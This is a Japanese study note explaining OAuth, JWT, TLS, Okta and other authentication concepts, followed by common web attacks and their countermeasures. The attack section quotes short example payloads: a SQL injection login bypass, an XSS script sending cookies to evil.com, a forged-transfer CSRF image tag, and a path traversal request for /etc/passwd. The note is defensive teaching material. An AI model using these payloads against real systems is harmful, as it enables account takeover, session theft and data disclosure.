# 認証・セキュリティ基礎

### QA（Quality Assurance／キューエー）
Quality Assuranceの略。<br>
ソフトウェアの品質を保証するためのテストや検証の総称。<br>
バグ検出、動作確認、受け入れテストなどを含む活動全般。QAは開発の信頼性を高める重要な役割を持つ。<br>
リリース前の自動テストや手動確認によって不具合を防ぐ。<br>

---

### OAuth（Open Authorization／オーオース）
**認可（Authorization）のためのプロトコル（通信ルール・仕様）。**<br>
特定の技術や仕組みではなく、クライアントと認可サーバーの間でアクセストークンを安全にやり取りするための**標準規格**。<br>
現在は OAuth 2.0 が主流。<br>

**OAuth の目的:**<br>
あるサービス（クライアント）が、別のサービス（リソースサーバー）にあるユーザーのデータに**安全にアクセスする権限を得る**こと。<br>
**パスワードを共有せずに、限定的なアクセス権限を委譲できる。**<br>

**登場人物（4つの役割）:**<br>
- **リソースオーナー（Resource Owner）**: ユーザー本人（データの持ち主）<br>
- **クライアント（Client）**: アクセスしたいアプリケーション（例: あなたのWebサービス）<br>
- **認可サーバー（Authorization Server）**: アクセス許可を管理し、トークンを発行（例: Google、GitHub）<br>
- **リソースサーバー（Resource Server）**: 保護されたデータを持つサーバー（例: Google Drive、GitHub API）<br>

**基本的な流れ:**<br>
```
1. ユーザーがアプリ（クライアント）を使おうとする
2. アプリが「Googleのデータにアクセスしたい」と認可サーバーに要求
3. ユーザーがGoogle（認可サーバー）にログインして「許可する」をクリック
4. 認可サーバーがアクセストークンを発行
5. アプリがトークンを使ってGoogle（リソースサーバー）のAPIにアクセス
→ パスワードを渡さずに、限定的な権限でデータ取得できる
```

**具体例（カレンダー連携アプリ）:**<br>
```
あなたのアプリがGoogleカレンダーにアクセスしたい場合:
1. ユーザーが「Googleカレンダーと連携」ボタンをクリック
2. Googleのログイン画面に遷移（OAuth認可サーバー）
3. 「このアプリにカレンダーの読み取り権限を与えますか？」と表示
4. ユーザーが「許可」→ Googleがアクセストークンを発行
5. アプリはトークンを使ってGoogleカレンダーAPIを呼び出せる

重要: アプリはユーザーのGoogleパスワードを知らない。トークンだけで操作できる。
```

**OAuth は「認可」であって「認証」ではない:**<br>
- **認可（Authorization）**: 「何ができるか」の権限付与 ← OAuthの本来の目的<br>
- **認証（Authentication）**: 「誰であるか」の本人確認 ← OAuth単体ではカバーしない<br>

「Googleでログイン」のような機能は、OAuth に **OpenID Connect（OIDC）** という認証レイヤーを追加したもの。<br>
OAuth 単体では「ユーザーが誰か」を保証しないため、認証には OIDC が使われる。<br>

**OAuth のメリット:**<br>
- パスワードを他サービスに渡さずに済む（セキュリティ向上）<br>
- 権限を限定できる（読み取りのみ、特定のリソースのみなど）<br>
- トークンを取り消せば、いつでも連携解除できる<br>

**実務でよく使う場面:**<br>
- ソーシャルログイン（Google、GitHub、LINEでログイン）<br>
- API連携（SlackにGoogleカレンダーを連携、GitHubにCIツールを連携）<br>
- モバイルアプリからWebサービスのAPIを叩く<br>

**OAuth 2.0 の主なフロー（Grant Type）:**<br>
- **認可コードフロー（Authorization Code）**: Webアプリ向け、最もセキュア<br>
- **インプリシットフロー（Implicit）**: SPAで使われたが非推奨に<br>
- **クライアントクレデンシャルフロー（Client Credentials）**: サーバー間通信<br>
- **リソースオーナーパスワードクレデンシャル（ROPC）**: 非推奨<br>

**参考資料:**<br>
OAuth の仕組みを理解するのに非常に分かりやすい記事:<br>
[一番分かりやすい OAuth の説明 - Qiita](https://qiita.com/TakahikoKawasaki/items/e37caf50776e00e733be)

---

### JWT（JSON Web Token／ジョット）
**トークンのフォーマット（データ構造の仕様）。**<br>
JWT自体は認証の仕組みではなく、情報を安全にやり取りするための**JSON形式のトークン規格**。<br>
認証・認可で使われることが多いが、JWT はあくまで「データの入れ物」。<br>

**JWT の構造:**<br>
3つの部分をドット（`.`）で繋いだ形式。<br>
```
Header.Payload.Signature
例: eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOjEyM30.AbCdEfGhIjKlMnOpQrStUvWxYz
```

**各部分の役割:**<br>
- **Header（ヘッダー）**: トークンのタイプやアルゴリズム情報（例: `{"alg":"HS256","typ":"JWT"}`）<br>
- **Payload（ペイロード）**: 実際のデータ（ユーザーID、有効期限など。例: `{"userId":123,"exp":1234567890}`）<br>
- **Signature（署名）**: 改ざん検知用の署名（Header + Payload を秘密鍵で署名）<br>

**重要な特徴:**<br>
- **自己完結型（Self-contained）**: トークン自体に情報が含まれているため、DBを参照せずに検証できる<br>
- **改ざん検知**: 署名により、内容が改ざんされていないか確認できる<br>
- **暗号化ではない**: Payload は Base64 エンコードされているだけで、誰でも読める（機密情報は入れない）<br>

**JWT が使われる場面:**<br>
1. **認証トークン**: ログイン後にサーバーが発行し、以降のリクエストで本人確認に使う<br>
2. **OAuth のアクセストークン**: OAuth 2.0 でアクセストークンとして JWT が使われることがある<br>
3. **API 認証**: マイクロサービス間の通信で、リクエスト元を検証する<br>
4. **情報交換**: 改ざん検知が必要なデータのやり取り<br>

**具体的な使い方の例（ログイン〜API呼び出し）:**<br>
```
【実装例①：ログイン時】
1. ユーザーがブラウザでログインフォームに入力（ユーザー名、パスワード）
2. ブラウザ（クライアント）が POST /login でサーバーに送信
3. サーバーがDBでユーザー認証（パスワードハッシュを照合）
4. 認証成功 → サーバーがJWTを生成
   - Payload作成: {"userId": 123, "exp": 1234567890}
   - 秘密鍵で署名
   - Header.Payload.Signature 形式に変換
5. サーバーがJWTをレスポンスで返す
   例: { "token": "eyJhbGciOiJIUzI1NiJ9..." }
6. ブラウザ（クライアント）がJWTを保存
   - Cookie（HttpOnly推奨）、または
   - LocalStorage、SessionStorage

【実装例②：フロントからAPI呼び出し時】
7. ユーザーがAPI機能を使う（例: プロフィール取得ボタンをクリック）
8. ブラウザが保存したJWTをAuthorizationヘッダーに付けてリクエスト送信
   GET /api/profile
   Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
9. サーバーがJWTを受け取る
10. サーバーが署名を検証（秘密鍵で改ざんチェック）
11. 署名が正しい → PayloadからuserIdを取り出す
12. サーバーがuserIdを使ってDBからデータ取得して返す
    （DBに「このJWTは有効か」を問い合わせる必要なし）

ポイント: サーバーはJWTの署名検証だけで信頼性を確認できる（ステートレス）

【実装例③：OAuth準拠のマイクロサービス連携】
1. ユーザーがフロント画面で操作（例: データ取得ボタンをクリック）
2. フロントがマイクロサービスAにリクエスト送信
   GET /api/data
3. マイクロサービスAがOktaにアクセストークンを要求
   POST https://okta.example.com/oauth2/token
   リクエストボディ: 
   {
     "grant_type": "client_credentials",
     "client_id": "service_a_client_id",
     "client_secret": "service_a_secret",
     "scope": "service_b.read"
   }
4. Oktaがトークンを発行して返す
   レスポンス: 
   {
     "access_token": "eyJhbGciOiJSUzI1NiJ9...",
     "token_type": "Bearer",
     "expires_in": 3600
   }
5. マイクロサービスAが取得したトークンを使ってマイクロサービスBのAPIを呼び出し
   GET https://service-b.example.com/api/resource
   Authorization: Bearer eyJhbGciOiJSUzI1NiJ9...
6. マイクロサービスBがトークンを検証
   - Oktaのintrospection endpointにトークンを送信、または
   - OktaのJWKS（公開鍵）を使って署名検証（トークンのPayloadにjti, client_id, scopeなどが含まれるため、どのサービスが発行したトークンかをOktaが何のトークンか識別可能）
7. 検証成功 → マイクロサービスBがデータを取得してマイクロサービスAに返す
8. マイクロサービスAがフロントにレスポンスを返す

ポイント: 
- マイクロサービス間の通信にOAuth 2.0（Client Credentials Flow）を使用
- パスワードではなくclient_id/client_secretで認証
- トークンにはjti（JWT ID）やclient_idが含まれており、Oktaはこれで検証対象を識別
- RS256（非対称鍵）が使われることが多く、各サービスは公開鍵で検証可能
```

**JWT のメリット:**<br>
- サーバー側でセッション情報を保持しなくてよい（ステートレス）<br>
- 署名検証だけで信頼性を確認できる（DB参照不要）<br>
- マイクロサービスやSPA（Single Page Application）と相性が良い<br>

**JWT のデメリット・注意点:**<br>
- **無効化が難しい**: 一度発行すると有効期限まで有効（ログアウト処理が複雑）<br>
- **サイズが大きい**: Cookie のサイズ制限に引っかかる可能性<br>
- **Payload は暗号化されていない**: 機密情報（パスワード、クレカ番号）は入れない<br>
- **盗まれると危険**: XSSで盗まれると攻撃者がなりすまし可能（HttpOnly Cookie 推奨）<br>

**JWT vs セッション:**<br>

| 項目 | JWT | セッション |
|------|-----|-----------|
| **保存場所** | クライアント側（Cookie、LocalStorage） | サーバー側（メモリ、Redis、DB） |
| **ステート** | ステートレス（サーバーに状態なし） | ステートフル（サーバーが保持） |
| **無効化** | 困難（有効期限まで有効） | 容易（サーバー側で削除） |
| **スケーラビリティ** | 高い（サーバー間で状態共有不要） | 低い（セッション共有が必要） |
| **セキュリティ** | 盗まれると無効化困難 | サーバー側で管理できる |

**実務での使い分け:**<br>
- **JWT向き**: API認証、マイクロサービス、SPA、モバイルアプリ<br>
- **セッション向き**: 従来型Webアプリ、即座に無効化したい場合<br>

[JWTについての詳細ページ](jwt.md)

---

### ベーシック認証
最も単純なHTTP認証方式。<br>
ユーザー名とパスワードをBase64でエンコードして送る（暗号化ではない）。<br>
シンプルだが安全性は低く、HTTPSと併用するか別の方式が推奨。<br>
社内システムの簡易保護に使われることがあるが、公開サービスでは避けるべき。<br>

---

### SSL/TLS（Secure Sockets Layer/Transport Layer Security、エスエスエル/ティーエルエス）
WebサイトがHTTPSで安全に通信するための証明書技術。<br>
通信内容を暗号化し、サーバーの身元を証明することで、盗聴や改ざん、なりすましを防ぐ。<br>
現在はSSLよりも安全性の高いTLSが主流になっており、名残で「SSL証明書」と呼ばれることもあるが、実際はTLS証明書。<br>

[SSL/TLSの詳細ページ](ssl_tls.md)

---

### クライアント認証
サーバーが利用者（クライアント）を証明書で確認する仕組み。<br>
通常はサーバー証明書でサーバー側を確認するが、クライアント証明書を用いると強固なアクセス制御ができる。<br>
社内PCに証明書を配布し、証明書を持たない端末はサービスにアクセスできないようにする。<br>

---

### Okta（オクタ）
企業向けのID管理・認証を提供する外部サービス（IDaaS: Identity as a Service）。<br>
自社で認証システムを構築・運用する代わりに、Oktaを使うことで高度な認証機能を簡単に導入できる。<br>
1回のログインで複数のアプリケーション（SSO）にアクセスでき、パスワードはOktaにのみ保存される。<br>
社員の入退社時のアカウント管理を効率化し、セキュリティを強化できる。<br>

[Oktaの詳細ページ](okta.md)

<div style="height:50px;"></div>

---

## 代表的なサイバー攻撃

### SQLインジェクション（SQL Injection）
**最も危険な攻撃の一つ。**<br>
Webフォームなどの入力欄に悪意のあるSQL文を混入させ、データベースを不正に操作する攻撃。<br>
ユーザー情報の漏洩、データの改ざん・削除、最悪の場合はシステム全体の乗っ取りが可能。<br>

**攻撃例:**<br>
```
ログインフォームに入力:
ユーザー名: admin' OR '1'='1
パスワード: （何でも）

もし脆弱なコードなら:
SELECT * FROM users WHERE name='admin' OR '1'='1' AND password='...'
→ '1'='1' が常に真なので、パスワードなしでログインできてしまう
```

**対策:**<br>
- **プリペアドステートメント（パラメータ化クエリ）を使う**（最重要）<br>
- 入力値のエスケープ処理<br>
- 最小権限の原則（DBユーザーに必要以上の権限を与えない）<br>

**実務での確認ポイント:**<br>
- フォーム入力を直接SQL文に連結していないか<br>
- ORMやフレームワークの安全な機能を使っているか<br>

---

### XSS（Cross-Site Scripting／クロスサイトスクリプティング）
Webページに悪意のあるJavaScriptを埋め込み、他のユーザーのブラウザで実行させる攻撃。<br>
セッションIDの盗取、偽のログイン画面表示、個人情報の窃取などが可能。<br>

**攻撃例:**<br>
```
掲示板にコメント投稿:
<script>document.location='http://evil.com?cookie='+document.cookie</script>

他のユーザーがこのページを見ると:
→ Cookieが攻撃者のサーバーに送信される
→ セッションハイジャックが可能に
```

**3つのタイプ:**<br>
- **反射型（Reflected XSS）**: URLパラメータなどに仕込まれ、即座に実行<br>
- **格納型（Stored XSS）**: DBに保存され、閲覧時に実行（最も危険）<br>
- **DOM-based XSS**: クライアント側のJavaScriptでDOMを操作する際に発生<br>

**対策:**<br>
- **HTMLエスケープ処理**（`<` → `&lt;`、`>` → `&gt;`）<br>
- Content Security Policy（CSP）ヘッダーの設定<br>
- フレームワークの自動エスケープ機能を活用<br>
- 入力値の検証（ホワイトリスト方式）<br>

**実務での確認ポイント:**<br>
- ユーザー入力をそのままHTMLに表示していないか<br>
- innerHTML などを使う際にエスケープしているか<br>

---

### CSRF（Cross-Site Request Forgery／クロスサイトリクエストフォージェリ）
ログイン中のユーザーに、意図しないリクエストを強制的に送信させる攻撃。<br>
**別名: XSRF（クロスサイトリクエストフォージェリ）**<br>

**攻撃例:**<br>
```
ユーザーが銀行サイトにログイン中に、攻撃者のサイトを訪問:
<img src="https://bank.com/transfer?to=attacker&amount=10000">

ブラウザは自動的にCookieを送信するため:
→ 気づかないうちに送金リクエストが実行される
```

**対策:**<br>
- **CSRFトークン**の使用（フォームごとに一意のトークンを埋め込む）<br>
- SameSite Cookie属性の設定<br>
- 重要な操作では再認証を要求<br>
- Refererヘッダーの検証<br>

**実務での確認ポイント:**<br>
- POST/PUT/DELETEなど状態を変える操作にCSRFトークンがあるか<br>
- フレームワークのCSRF保護機能を有効にしているか<br>

---

### DDoS攻撃（Distributed Denial of Service／分散型サービス拒否攻撃）
大量のリクエストを同時に送りつけて、サーバーをダウンさせたり、正常なユーザーがアクセスできなくする攻撃。<br>
複数のコンピューター（ボットネット）から一斉に攻撃するため「分散型」と呼ばれる。<br>

**攻撃の影響:**<br>
- サーバーの過負荷でサービス停止<br>
- 帯域幅の枯渇<br>
- 正規ユーザーがアクセスできない<br>

**対策:**<br>
- CDN（Cloudflare、Akamai）の利用<br>
- レート制限（Rate Limiting）<br>
- トラフィック監視とIP制限<br>
- クラウドサービスのDDoS保護機能<br>

**実務での確認ポイント:**<br>
- APIにレート制限があるか<br>
- 異常なトラフィックを検知する仕組みがあるか<br>

---

### ブルートフォース攻撃（Brute Force Attack／総当たり攻撃）
パスワードやPINコードを片っ端から試して突破する力技の攻撃。<br>
辞書攻撃（よく使われる単語リストを試す）も含まれる。<br>

**対策:**<br>
- **アカウントロックアウト**（N回失敗でロック）<br>
- **レート制限**（同一IPからの連続試行を制限）<br>
- **多要素認証（MFA）**の導入<br>
- CAPTCHA の設置<br>
- 強固なパスワードポリシー（長さ、複雑さ）<br>

**実務での確認ポイント:**<br>
- ログイン試行回数の制限があるか<br>
- 多要素認証を提供しているか<br>

---

### 中間者攻撃（MITM: Man-in-the-Middle Attack）
通信の途中に攻撃者が割り込み、データを盗聴・改ざんする攻撃。<br>
公衆Wi-Fiなどで被害に遭いやすい。<br>

**攻撃例:**<br>
```
ユーザー ← → 攻撃者 ← → サーバー
          ↑
       盗聴・改ざん
```

**具体的な手法:**<br>
- 公衆Wi-Fiで偽のアクセスポイントを設置<br>
- ARP Spoofing でネットワークトラフィックを横取り<br>
- DNS Spoofing で偽のサイトに誘導<br>

**対策:**<br>
- **HTTPS（SSL/TLS）の使用**（最重要）<br>
- VPNの利用<br>
- HSTS（HTTP Strict Transport Security）の設定<br>
- 証明書の検証<br>

**実務での確認ポイント:**<br>
- 全ページがHTTPSか（HTTPのページが残っていないか）<br>
- 証明書が有効か<br>

---

### セッションハイジャック（Session Hijacking）
ログイン中のユーザーのセッションIDを盗み取り、本人になりすます攻撃。<br>
XSSやネットワーク盗聴でセッションIDを取得される。<br>

**攻撃の流れ:**<br>
```
1. 正規ユーザーがログイン → セッションID発行
2. 攻撃者がXSSや盗聴でセッションIDを取得
3. 攻撃者がそのセッションIDを使ってアクセス
4. サーバーは正規ユーザーと判断してしまう
```

**対策:**<br>
- **HTTPSの使用**（セッションIDの盗聴防止）<br>
- **HttpOnly Cookie**（JavaScriptからアクセス不可）<br>
- **Secure Cookie**（HTTPS通信時のみ送信）<br>
- セッションIDの定期的な再生成<br>
- IPアドレスやUser-Agentの検証<br>

**実務での確認ポイント:**<br>
- Cookie設定に HttpOnly と Secure フラグがあるか<br>
- ログイン成功時にセッションIDを再生成しているか<br>

---

### ディレクトリトラバーサル（Directory Traversal／パストラバーサル）
ファイルパスを操作して、本来アクセスできないファイルやディレクトリにアクセスする攻撃。<br>

**攻撃例:**<br>
```
正常なリクエスト:
GET /download?file=report.pdf

攻撃リクエスト:
GET /download?file=../../../../etc/passwd
→ サーバーのパスワードファイルが読み取られる可能性
```

**対策:**<br>
- アプリ側で**入力値の検証**（特定のディレクトリ以外拒否や、`../` などを含むパスを拒否）<br>
- ホワイトリスト方式（許可されたファイル名のみ）<br>
- アプリケーションの実行ユーザー権限を最小化<br>
- ファイルアップロード先の制限<br>

**実務での確認ポイント:**<br>
- ファイルパスをユーザー入力から直接構築していないか<br>
- ファイルダウンロード機能で適切な検証があるか<br>

---

### ゼロデイ攻撃（Zero-Day Attack）
まだ公開されていない脆弱性（ゼロデイ脆弱性）を悪用した攻撃。<br>
開発者が修正パッチを作る前（発見から0日目）に攻撃されるため、防御が困難。<br>

**特徴:**<br>
- パッチが存在しないため対策が困難<br>
- 高度な攻撃者（国家レベル、APT（Advanced Persistent Threat））が利用することが多い<br>
- 発見→公開→パッチ適用までのタイムラグが狙われる<br>

**対策:**<br>
- **多層防御**（WAF、IDS/IPS、ファイアウォール）<br>
- **最小権限の原則**（被害の範囲を最小化）<br>
- 異常検知システム<br>
- セキュリティパッチの迅速な適用（公開後すぐ）<br>

---

### ランサムウェア（Ransomware）
コンピューターやファイルを暗号化して使えなくし、復号化と引き換えに身代金を要求するマルウェア。<br>
企業のデータを人質に取り、ビットコインなどで支払いを要求する。<br>

**感染経路:**<br>
- フィッシングメールの添付ファイル<br>
- 脆弱性のあるソフトウェア経由<br>
- 不正なWebサイトからのダウンロード<br>

**対策:**<br>
- **定期的なバックアップ**（最重要、オフライン保管）<br>
- メールの添付ファイルを安易に開かない<br>
- OSやソフトウェアの最新化<br>
- アンチウイルスソフトの導入<br>
- セキュリティ教育<br>

**実務での確認ポイント:**<br>
- バックアップが定期的に取られているか<br>
- バックアップは暗号化されるネットワークから隔離されているか<br>

---

### フィッシング（Phishing）
本物そっくりの偽サイトやメールで、ユーザーをだまして個人情報（ID、パスワード、クレジットカード番号）を盗む攻撃。<br>

**手口:**<br>
- 銀行やECサイトを装ったメール<br>
- 「アカウントが停止されます」などの緊急性を煽る内容<br>
- 偽のログインページに誘導してパスワード入力させる<br>

**派生形:**<br>
- **スピアフィッシング**: 特定の個人や企業を狙った標的型攻撃<br>
- **ホエーリング**: 経営層など重要人物を狙った攻撃<br>
- **スミッシング**: SMSを使ったフィッシング<br>

**対策:**<br>
- URLを確認する習慣（ドメイン名が正しいか）<br>
- メールのリンクを安易にクリックしない<br>
- 多要素認証の導入（パスワードが盗まれても突破されにくい）<br>
- セキュリティ教育・訓練<br>

**実務での確認ポイント:**<br>
- 社員向けのセキュリティ訓練を実施しているか<br>
- メールのフィルタリングがあるか<br>

<div style="height:50px;"></div>
